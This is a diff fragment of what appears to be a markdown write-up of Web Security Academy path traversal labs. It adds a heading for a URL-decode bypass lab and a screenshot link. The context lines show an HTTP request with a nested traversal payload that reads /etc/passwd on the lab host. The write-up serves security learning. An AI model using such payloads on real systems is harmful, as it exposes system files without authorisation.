@@ -10,3 +10,7 @@ GET /image?filename=....//....//....//....//etc/passwd HTTP/2
 Host: 0afc0083049fe2ff877f7f5400b400a1.web-security-academy.net
 ```
 
+
+## File path traversal, traversal sequences stripped with superfluous URL-decode
+
+![path traversal brute](./images/path-traversal-brute.png)
